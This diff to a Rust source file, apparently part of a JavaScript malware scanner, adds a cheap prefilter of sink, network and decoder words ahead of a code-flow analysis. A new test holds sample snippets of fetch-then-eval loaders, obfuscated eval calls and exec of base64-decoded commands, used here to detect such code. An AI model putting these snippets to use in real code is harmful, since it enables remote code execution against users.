@@ -32,6 +32,7 @@ use std::borrow::Cow;
 use std::collections::{HashMap, HashSet};
 use std::sync::LazyLock;
 
+use aho_corasick::AhoCorasick;
 use regex::Regex;
 
 use super::js_lex::{self, Kind, Lexed};
@@ -155,25 +156,6 @@ const CONTROL: &[&str] = &[
     "yield", "new", "in", "of", "case", "do", "else", "throw", "delete", "void",
 ];
 
-/// A file with none of these words cannot hold a dynamic code or command
-/// sink; `\u` and `\x` are listed because a name can be written with them.
-const SINK_WORDS: &[&str] = &[
-    "eval",
-    "Function",
-    "runIn",
-    "compile",
-    "exec",
-    "spawn",
-    "constructor",
-    "Script",
-    "global",
-    "window",
-    "self",
-    "this[",
-    "\\u",
-    "\\x",
-];
-
 /// The scope of a name declared at the top of the file.
 const FILE_SCOPE: usize = usize::MAX - 1;
 
@@ -185,11 +167,147 @@ const MAX_PASSES: usize = 5;
 
 /// The flow findings of one file's text.
 pub(crate) fn flow(text: &str) -> Vec<Found> {
-    if !SINK_WORDS.iter().any(|word| text.contains(word)) {
+    if !worth_analysing(text) {
         return Vec::new();
     }
     let lexed = js_lex::lex(text);
+    let analysis = Flow::new(text, &lexed);
+    if !analysis.candidate() {
+        return Vec::new();
+    }
+    analysis.run()
+}
+
+/// The analysis without the cheap tests in front of it (tests compare the two).
+#[cfg(test)]
+pub(crate) fn flow_unfiltered(text: &str) -> Vec<Found> {
+    let lexed = js_lex::lex(text);
     Flow::new(text, &lexed).run()
+}
+
+const CODE: u8 = 1;
+const COMMAND: u8 = 2;
+const GLOBAL: u8 = 4;
+const NETWORK: u8 = 8;
+const DECODER: u8 = 16;
+
+/// The words the cheap test looks for, with what each is evidence of. A module
+/// is written with its quotes (`'got'`), because `got` and `ky` are inside many
+/// words. `constructor` is counted apart: the chain `x.constructor.constructor`
+/// needs it twice. A name or a string can be written with `\u` or `\x` escapes,
+/// so those count as everything.
+const WORDS: &[(&str, u8)] = &[
+    ("eval", CODE),
+    ("Function", CODE),
+    ("runIn", CODE),
+    ("compileFunction", CODE),
+    ("_compile", CODE),
+    ("Script", CODE),
+    ("exec", COMMAND),
+    ("spawn", COMMAND),
+    ("global", GLOBAL),
+    ("window", GLOBAL),
+    ("self", GLOBAL),
+    ("this", GLOBAL),
+    ("fetch", NETWORK),
+    ("axios", NETWORK),
+    ("XMLHttpRequest", NETWORK),
+    ("jQuery", NETWORK),
+    ("$.", NETWORK),
+    ("undici", NETWORK),
+    ("superagent", NETWORK),
+    ("needle", NETWORK),
+    ("follow-redirects", NETWORK),
+    ("request-promise", NETWORK),
+    ("'request'", NETWORK),
+    ("\"request\"", NETWORK),
+    ("'got'", NETWORK),
+    ("\"got\"", NETWORK),
+    ("'ky'", NETWORK),
+    ("\"ky\"", NETWORK),
+    ("'bent'", NETWORK),
+    ("\"bent\"", NETWORK),
+    ("'phin'", NETWORK),
+    ("\"phin\"", NETWORK),
+    ("'centra'", NETWORK),
+    ("\"centra\"", NETWORK),
+    ("http'", NETWORK),
+    ("http\"", NETWORK),
+    ("https'", NETWORK),
+    ("https\"", NETWORK),
+    ("http2'", NETWORK),
+    ("http2\"", NETWORK),
+    ("atob", DECODER),
+    ("Buffer", DECODER),
+    ("unescape", DECODER),
+    ("fromCharCode", DECODER),
+    ("\\x", CODE | DECODER),
+    ("\\u", CODE | NETWORK | DECODER),
+    ("constructor", 0),
+];
+
+static AUTOMATON: LazyLock<AhoCorasick> = LazyLock::new(|| {
+    AhoCorasick::builder()
+        .match_kind(aho_corasick::MatchKind::Standard)
+        .kind(Some(aho_corasick::AhoCorasickKind::DFA))
+        .build(WORDS.iter().map(|(word, _)| *word))
+        .expect("valid patterns")
+});
+
+/// A cheap test that decides whether the lexer and the analysis can find
+/// anything, in one pass over the text. It only ever says no for a file in which
+/// no finding is possible:
+///
+/// - a flow finding needs a sink that runs code and a network call or a
+///   decoder; the sink of `Function("require")` needs no source;
+/// - an encoded payload in a command sink (`exec`, `spawn`) needs a decoder, a
+///   long base64 run or escapes;
+/// - a call on the global object by a computed name is only reported next to a
+///   network call;
+/// - a file with as many bytes as the token limit has tokens may be cut, and is
+///   always analysed once it has any sink word.
+fn worth_analysing(text: &str) -> bool {
+    let mut seen = 0u8;
+    let mut constructors = 0;
+    for found in AUTOMATON.find_overlapping_iter(text) {
+        let (word, mask) = WORDS[found.pattern().as_usize()];
+        seen |= mask;
+        if word == "constructor" {
+            constructors += 1;
+            if constructors == 2 {
+                seen |= CODE;
+            }
+        }
+    }
+    let code = seen & CODE != 0;
+    if !(code || seen & (COMMAND | GLOBAL) != 0) {
+        return false;
+    }
+    if text.len() >= js_lex::MAX_TOKENS {
+        return true;
+    }
+    let net = seen & NETWORK != 0;
+    let blob = seen & DECODER != 0 || has_base64_run(text);
+    (code && (net || blob || (text.contains("Function") && text.contains("require"))))
+        || (seen & COMMAND != 0 && blob)
+        || (seen & GLOBAL != 0 && net)
+}
+
+/// Whether the text has 64 base64 characters in a row, the shortest blob the
+/// analysis calls one.
+fn has_base64_run(text: &str) -> bool {
+    let mut run = 0;
+    for &b in text.as_bytes() {
+        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_') {
+            run += 1;
+            if run >= 64 {
+                return true;
+            }
+        } else {
+            run = 0;
+        }
+    }
+    false
 }
 
 struct Flow<'a> {
@@ -1815,6 +1933,68 @@ impl<'a> Flow<'a> {
         }
     }
 
+    /// A second, cheaper test on the tokens, after the lexer and before the
+    /// passes (which cost three times as much as lexing): the file must have a
+    /// sink and a source in the sense of `worth_analysing`, this time as code and
+    /// not as words in a comment or a string, or be cut at the token limit. It
+    /// only says no where no finding is possible.
+    fn candidate(&self) -> bool {
+        if self.lx.truncated {
+            return true;
+        }
+        const CODE: &[&str] = &[
+            "eval",
+            "Function",
+            "runInThisContext",
+            "runInNewContext",
+            "runInContext",
+            "compileFunction",
+            "_compile",
+            "constructor",
+            "Script",
+        ];
+        const COMMAND: &[&str] = &[
+            "execSync",
+            "execFileSync",
+            "spawnSync",
+            "execFile",
+            "exec",
+            "spawn",
+        ];
+        const GLOBALS: &[&str] = &["window", "global", "globalThis", "self", "this"];
+        const NET: &[&str] = &["fetch", "axios", "XMLHttpRequest", "$", "jQuery"];
+        const DECODERS: &[&str] = &["atob", "unescape", "Buffer", "String"];
+        let (mut code, mut command, mut global) = (false, false, false);
+        let (mut net, mut decoder, mut function, mut require) = (false, false, false, false);
+        for k in 0..self.n() {
+            match self.kind(k) {
+                Some(Kind::Ident) => {
+                    let Some(name) = self.name(k) else { continue };
+                    let name = &*name;
+                    code |= CODE.contains(&name);
+                    command |= COMMAND.contains(&name);
+                    global |= GLOBALS.contains(&name) && self.punct(k + 1, b'[');
+                    net |= NET.contains(&name);
+                    decoder |= DECODERS.contains(&name);
+                    function |= name == "Function";
+                    require |= name == "require";
+                }
+                Some(Kind::Str) => {
+                    if let Some(value) = self.str_val(k) {
+                        code |= matches!(value.as_str(), "vm" | "node:vm");
+                        command |= matches!(value.as_str(), "child_process" | "node:child_process");
+                        net |= NET_MODULES.contains(&value.as_str());
+                    }
+                    decoder |= blob_literal(self.lx.raw(self.text, k)).is_some();
+                }
+                _ => {}
+            }
+        }
+        (code && (net || decoder || (function && require)))
+            || (command && decoder)
+            || (global && net)
+    }
+
     fn run(mut self) -> Vec<Found> {
         self.compute_enclosing();
         self.collect_decls();
@@ -2297,6 +2477,38 @@ mod tests {
             .filter(|(k, _)| *k == FoundKind::FunctionRequire)
             .count();
         assert_eq!(n, 2);
+    }
+
+    #[test]
+    fn the_prefilter_never_changes_what_is_found() {
+        let samples = [
+            "const r = await axios.get('https://a.example.invalid/a');\neval(r.data);",
+            "new Function('require', c)(require);",
+            "eval(atob(x));",
+            "const p = \"QUJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5QUJjZGVmZ2hpamtsbW5vcA==\"; eval(p);",
+            "\\u0065val(String.fromCharCode(1,2,3,4,5,6,7,8));",
+            "fetch(u).then(r => r.text()).then(c => { window['ev' + 'al'](c); });",
+            "eval(x); const t = `never closed",
+            "const a = 1; eval('1');",
+            "fetch(u); const t = 2;",
+            "var request = 1; Function.prototype.call.call(request);",
+            "const { exec } = require('child_process'); exec(Buffer.from(x, 'base64').toString());",
+            "const { exec } = require('child_process'); exec('ls'); fetch(u);",
+            "axios.get(u); this['ev' + 'al'](x);",
+            "x . constructor . constructor ( c ) ( ); fetch(u);",
+            "const r = await fetch(u); x.constructor.constructor(r)();",
+            "const vm = require('vm'); const r = await fetch(u); new vm.Script(r);",
+            "regex.exec(s); window.title = 1;",
+        ];
+        for text in samples {
+            let key = |found: Vec<Found>| -> Vec<(usize, usize, String)> {
+                found
+                    .into_iter()
+                    .map(|f| (f.start, f.end, f.reason))
+                    .collect()
+            };
+            assert_eq!(key(flow(text)), key(flow_unfiltered(text)), "{text}");
+        }
     }
 
     #[test]
